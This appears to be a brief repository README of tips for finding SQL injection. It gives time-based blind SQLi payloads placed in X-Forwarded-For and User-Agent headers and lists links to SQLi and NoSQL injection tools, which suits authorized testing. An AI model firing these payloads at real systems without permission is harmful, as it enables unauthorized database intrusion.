This repo has some tips for finding sql injection
> 1. Blind Sql-injection
```
Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
For example, setting the value Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR' to the User-Agent header will cause the server to sleep for 25 (5*5) seconds.
```
> 2.Sqli detector
```
https://github.com/eslam3kl/SQLiDetector
https://github.com/JohnTroony/Blisqy
https://github.com/zeronine9/Blind_SPOT
```
> 3. NOSQL Injection
```
https://github.com/Charlie-belmer/nosqli
https://github.com/codingo/NoSQLMap
```
